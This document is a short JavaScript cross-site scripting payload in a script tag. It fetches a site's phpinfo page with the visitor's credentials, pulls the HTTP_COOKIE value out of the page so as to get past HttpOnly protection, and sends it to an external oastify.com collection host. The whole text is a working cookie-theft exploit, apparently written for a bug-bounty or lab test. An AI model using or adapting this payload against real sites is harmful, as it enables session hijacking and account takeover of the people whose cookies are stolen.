<script>
(async () => {
  const target = "/phpinfo.php"; // adjust path if needed
  const exfil = "https://rd88es043najc5o0z6ywpo7dt4zvnrbg.oastify.com/steal?cookie=";

  try {
    console.log("[XSS] Fetching phpinfo from", target);

    const r = await fetch(target, { credentials: "include" });
    console.log("[XSS] Response status:", r.status);

    const html = await r.text();
    console.log("[XSS] phpinfo length:", html.length);

    const d = new DOMParser().parseFromString(html, "text/html");

    // Debug: how many rows did we get?
    const rows = Array.from(d.querySelectorAll("table tr"));
    console.log("[XSS] Found table rows:", rows.length);

    let httpCookie = null;

    for (const tr of rows) {
      const keyCell = tr.querySelector("td.e");
      const valCell = tr.querySelector("td.v");

      if (!keyCell || !valCell) continue;

      const keyText = keyCell.textContent.trim();
      if (keyText === "HTTP_COOKIE") {
        httpCookie = valCell.textContent.trim();
        console.log("[XSS] Matched HTTP_COOKIE row:", tr);
        break;
      }
    }

    if (!httpCookie) {
      console.warn("[XSS] HTTP_COOKIE not found in phpinfo output");
      return;
    }

    console.log("[XSS] Extracted HTTP_COOKIE:", httpCookie);

    const exfilUrl = exfil + encodeURIComponent(httpCookie);
    console.log("[XSS] Exfiltrating to:", exfilUrl);

    await fetch(exfilUrl)
      .then(() => console.log("[XSS] Exfil request sent"))
      .catch(err => console.error("[XSS] Exfil fetch error:", err));

  } catch (e) {
    console.error("[XSS] Top-level error:", e);
  }
})();
</script>
